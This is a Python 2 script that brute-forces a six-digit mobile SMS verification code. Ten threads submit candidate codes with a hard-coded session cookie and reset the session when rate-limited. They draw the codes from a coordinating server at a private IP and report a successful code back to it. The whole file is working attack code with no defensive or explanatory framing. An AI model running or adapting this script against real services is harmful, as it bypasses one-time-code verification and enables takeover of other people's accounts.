# coding=utf8

import threading
import Queue
import time
import requests

q = Queue.Queue()
cookies = {'pdf': '4C47C302837C71F8EFCA161892CF2BD7'}

WAY_MOBILE = ''
SELECT_WAY = ''
break_flag = False


def try_captcha():
    global break_flag
    while 1:
        if break_flag:
            break
        captcha = q.get()
        code = "%06d" % captcha
        while 1:
            try:
                r = requests.post(WAY_MOBILE, data={'mobile_captcha': code},
                                  cookies=cookies)
                ret = r.json()
            except Exception, e:
                print e
                time.sleep(1)
                continue
            print r.request.body

            if ret.get('ok'):
                print code, 'Oh, yeah, get it'
                break_flag = True
                requests.get(
                    'http://192.168.60.110:8001/success/',
                    data={'success_capcha': code}
                )

            if not ret.get('ok') and not isinstance(ret.get('reason'), unicode):
                time.sleep(1)
                requests.get(SELECT_WAY % cookies.get('pdf'), cookies=cookies)
            else:
                break


def get_captcha():
    while 1:
        if q.empty():
            try:
                r = requests.get('http://192.168.60.110:8001/mobile/captcha/')
                ret = r.json()
                print 's'
            except:
                time.sleep(1)
                continue
            lt = ret.get('captcha')
            if lt:
                for a in lt:
                    q.put(int(a))
        time.sleep(1)
if __name__ == '__main__':
    lt = []
    for i in range(10):
        lt.append(threading.Thread(target=try_captcha))
    lt.append(threading.Thread(target=get_captcha))
    for th in lt:
        th.start()
    for th in lt:
        th.join()
